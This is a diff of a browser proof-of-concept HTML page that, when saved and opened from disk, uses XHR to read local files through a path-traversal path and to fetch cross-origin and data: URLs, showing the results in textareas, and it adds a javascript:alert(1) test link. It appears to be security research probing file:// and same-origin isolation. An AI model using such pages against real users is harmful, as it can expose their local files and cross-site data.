@@ -4,7 +4,7 @@
     <link rel="stylesheet" href="file:///C://" />
     <link rel="stylesheet" href="https://www.facebook.com/" />
 </head>
-<body>
+<body><a href="javascript:alert(1)">aaa</a><br>
     <textarea style="width: 434px; height: 310px;" id="facebook"></textarea>
     <textarea style="width: 434px; height: 310px;" id="files"></textarea>
     <script type="application/javascript">
@@ -23,8 +23,9 @@
             return oReq.response;
         };
         if (location.protocol == 'file:') {
-            facebook.value = doQ('./POC_files/a.htm"\'"');
-            files.value = doQ('./POC_files/a');
+            facebook.value = doQ('http://www.ass.com/');
+            files.value = doQ('data:text/html,a');
+			this.value = doQ('./a/../../../../../');
         } else {
             alert('Please hit CTRL+S and save this page first then open it locally.');
         }
